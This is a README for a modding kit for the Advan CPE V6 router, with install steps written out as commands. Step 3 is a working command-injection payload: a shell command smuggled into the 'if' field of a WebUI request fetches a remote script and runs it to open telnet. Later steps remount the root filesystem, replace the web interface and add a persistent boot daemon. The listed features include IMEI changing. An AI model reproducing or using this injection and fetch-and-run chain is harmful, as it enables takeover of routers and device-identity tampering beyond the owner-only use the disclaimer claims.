# Advan CPE V6
WebUI modding kit for **Advan CPE V6**.

## Disclaimer
- This project is provided for educational and research purposes only.
- Use at your own risk.
- Replacing WebUI files incorrectly may break the router interface.
- Always create a backup before deployment.
- Use this project only on devices you own.

## Included Features
- IMEI Change
- TTL Change
- AT Terminal
- Telnet Management
- vnStat Monitoring
- ADB Management
- Device Speed Limit
- Wi-Fi Blacklist
- SMS Inbox Reader

## Requirements
- Access to router WebUI
- Browser with WebSpy extension
- Shell access method (telnet/adb/serial)

## Quick Install (WebSpy Injection Method)
### 1. Install WebSpy
Download and install:

`https://raw.githubusercontent.com/shiwildy/Advan-CPE-V6/main/helper/webspy.zip`

### 2. Get `sessionId`
Log in to WebUI and capture `sessionId` from the login request in WebSpy.

### 3. Send injection payload
Send this POST payload (replace `YOUR_SESSION_ID`):

```json
{
  "cmd": 168,
  "method": "POST",
  "subcmd": 1,
  "stopped": "0",
  "if": "br0$(wget -qO- https://raw.githubusercontent.com/shiwildy/Advan-CPE-V6/main/script/telnet.sh | sh >/tmp/telnet.txt 2>&1; :)",
  "language": "EN",
  "sessionId": "xxxxxxxxxxxxxxxxx"
}
```

### 4. Deploy modded `tzwww`
After shell access is available, run:

```bash
mount -o remount,rw /
mkdir -p /home/mod/install
cd /home/mod/install

wget -O tzwww.tar.gz "https://raw.githubusercontent.com/shiwildy/Advan-CPE-V6/main/resources/1.0.3.tar.gz"
tar -xzf tzwww.tar.gz

# optional backup
mv /tzwww /home/backup 2>/dev/null

# deploy new webui
mv tzwww /

killall tcpdump >/dev/null 2>&1
chmod 755 /tzwww/cgi-bin/*.cgi
/etc/tzscript/mini_httpd_server.sh restart >/dev/null 2>&1
```

### 5. Install startup daemon (`script/daemon.sh`)
This script installs `/etc/init.d/modwebextra` and links it to `/etc/rcS.d/S98modwebextra`.

```bash
cd /home/mod/install
mkdir script && cd script
wget -O /home/mod/install/script/daemon.sh "https://raw.githubusercontent.com/shiwildy/Advan-CPE-V6/main/script/daemon.sh"
sh /home/mod/install/script/daemon.sh
```

Behavior:
- Uses `/home/mod/telnet`:
  - `1` = keep telnet enabled on boot
  - `0` = keep telnet disabled on boot
- Uses `/home/mod/ttl`:
  - empty = skip TTL apply on boot
  - `1..255` = apply that TTL on boot

Examples:

```bash
echo 1 > /home/mod/telnet
echo 61 > /home/mod/ttl
```

### 6. Install `vnstat.tar.gz` (optional)
Package file: `helper/vnstat.tar.gz`

```bash
mkdir -p /home && cd /home

wget -O vnstat.tar.gz "https://raw.githubusercontent.com/shiwildy/Advan-CPE-V6/main/helper/vnstat.tar.gz"
tar -xzf vnstat.tar.gz

chmod +x /home/vnstat/*.sh /home/vnstat/bin/vnstat /home/vnstat/lib/ld-linux.so.3
/home/vnstat/init-db.sh
/home/vnstat/daemon-lite.sh start
```

Quick check:

```bash
/home/vnstat/report.sh
```

## Notes
- After Step 4, make sure the WebUI loads correctly.
- If everything is working, remount rootfs to read-only:

```bash
mount -o remount,ro /
```

- Then perform a factory reset from the modem settings.
